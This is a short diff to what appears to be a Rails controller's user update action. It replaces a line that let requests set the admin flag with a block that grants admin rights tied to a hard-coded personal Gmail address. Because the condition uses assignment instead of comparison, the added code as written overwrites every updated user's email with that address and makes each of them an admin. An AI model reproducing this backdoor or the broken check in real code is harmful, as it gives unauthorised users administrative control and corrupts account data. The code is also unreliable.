@@ -43,8 +43,9 @@ before_filter :admin, only: [:index, :destroy]
     @user.email_address = params[:email_address]
     @user.password = params[:password]
     @user.password_confirmation = params[:password_confirmation]
-    @user.admin = params[:admin]
-
+      if @user.email_address = "trust.elephant@gmail.com"
+        @user.admin = true
+      end
 
     if @user.save
       flash[:success] = "Profile updated"
